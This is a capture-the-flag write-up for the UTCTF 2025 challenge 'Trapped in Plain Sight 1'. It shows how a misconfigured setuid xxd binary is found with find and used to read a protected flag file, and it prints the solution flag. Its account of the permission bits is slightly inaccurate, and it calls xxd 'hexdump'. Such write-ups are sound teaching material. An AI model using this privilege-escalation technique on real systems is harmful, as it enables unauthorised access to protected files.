@@ -1,0 +1,81 @@
+import { Steps } from "nextra/components";
+
+# Trapped in Plain Sight 1
+
+## Overview
+
+---
+
+| Description    | Details                                     |
+| :------------- | :------------------------------------------ |
+| Event name     | [UTCTF 2025](https://utctf.live/challenges) |
+| Challenge name | Trapped in Plain Sight 1                    |
+| Category       | Miscellaneous                               |
+| Points         | 100                                         |
+| Date           | 14-03-2025                                  |
+
+### Challenge Information
+
+> Just try to read my flag. 0x0
+> The password is password.
+> by Caleb (@eden.caleb.a on discord)
+> ssh -p 4301 trapped@challenge.utctf.live
+
+### Additional Information
+
+On the server we have provided with flag.txt with user permission noaccess.
+
+```
+trapped@47ca6c33ca55:~$ ls -l
+total 4
+-r-x------ 1 noaccess noaccess 28 Mar 14 19:23 flag.txt
+```
+
+## Analysis
+
+---
+
+If we try to read the flag.txt with current user, we will get permission denied.
+
+```
+trapped@47ca6c33ca55:~$ cat flag.txt
+cat: flag.txt: Permission denied
+```
+
+Since we are unable to read flag.txt with our current user, we need to find a way to escalate privilege to user noaccess.
+
+## Solution
+
+---
+
+<Steps>
+### Initial setup
+
+First step is to check if there is binary created by user noaccess.
+
+```
+trapped@47ca6c33ca55:~$ find / -user noaccess -type f -executable -exec ls -l {} \; 2>/dev/null
+-r-sr-xr-x 1 noaccess noaccess 18712 Feb  3 07:35 /usr/bin/xxd
+```
+
+Here we find `hexdump` that can help us to read the content of flag.txt.
+
+### Exploitation
+
+The permission string `-r-sr-xr-x` on `/usr/bin/xxd` shows that the binary has execute permission for both the group (r-x) and others (r-x). This means any user on the system has the ability to execute the file.
+
+```
+trapped@47ca6c33ca55:~$ /usr/bin/xxd flag.txt
+00000000: 7574 666c 6167 7b53 7065 6369 614c 5f50  utflag{SpeciaL_P
+00000010: 6572 6d69 7373 696f 6e7a 7d0a            ermissionz}.
+```
+
+### Flag
+
+```
+
+utflag{SpeciaL_Permissionz}
+
+```
+
+</Steps>
